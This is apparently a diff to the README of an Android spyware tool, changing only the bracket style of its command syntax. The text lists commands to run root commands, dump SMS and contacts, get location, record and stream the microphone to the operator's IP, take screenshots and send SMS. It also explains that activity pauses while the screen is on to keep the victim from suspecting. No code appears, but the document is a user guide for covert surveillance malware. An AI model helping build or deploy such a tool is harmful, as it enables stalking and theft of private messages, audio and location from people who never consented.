@@ -34,7 +34,7 @@ root <command>    -  try to execute command as root (if device is rooted)
 
 sms  - get all sms dump from device
 
-download <file_url>  - download file from the specified url onto device (into app's data/files directory)
+download [file_url]  - download file from the specified url onto device (into app's data/files directory)
 
 restart  - restarts the service
 
@@ -42,9 +42,9 @@ loc - get last known location  (active location isnt used because it can be too 
 
 info - get basic informaion such as current connection type,battery level, available memory and service provider name
 
-record <secs> - record sound from the mic for amount of seconds (will be saved to data/files/logs)
+record [secs] - record sound from the mic for amount of seconds (will be saved to data/files/logs)
 
-stream <ip> <port>  - start real-time streaming sound from the device's mic via udp to your listening computer * (client is described later)
+stream [ip] [port]  - start real-time streaming sound from the device's mic via udp to your listening computer * (client is described later)
 
 sync - upload all files that were logged to the app's files/logs directory
 
@@ -64,7 +64,7 @@ screenshot -  make a screenshot of the device's current screen (works on rooted 
 
 getcontacts  - get contact list with names and numbers from the device
 
-sendsms <number> <text>  - send sms to specified number with some text
+sendsms [number] [text]  - send sms to specified number with some text
 
 
 For the purposes of preserving invisibility all the "bad" activity is stopped once the device screen is on (except for call recording and incoming sms'es copies sending). This way it wont disturb user and decrease the probability of them starting to suspect something.
